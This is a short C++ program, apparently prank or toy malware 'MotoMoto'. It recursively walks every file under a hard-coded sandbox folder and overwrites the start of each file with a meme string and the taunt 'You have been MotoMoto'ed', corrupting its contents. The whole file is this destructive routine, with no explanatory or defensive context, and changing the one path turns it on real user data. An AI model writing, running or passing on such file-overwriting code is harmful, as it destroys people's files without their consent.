#include <windows.h>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <cstdio>
#include "meme.h"



int main() {

	std::filesystem::path path = "C:\\Users\\admin\\Desktop\\sandbox";


	for (auto& i: std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied))
	{
		if (!i.is_directory())
		{
			motomoto::meme rand_meme = motomoto::meme();
			std::cout << i.path() << std::endl;
			std::fstream file;
			file.open(i.path());
			file << rand_meme.get_meme() << ", You have been MotoMoto'ed" << std::endl;
			file.close();
		}
	}
	std::cout << "you have been MotoMoto'ed!!!" << std::endl;
	return 0;
}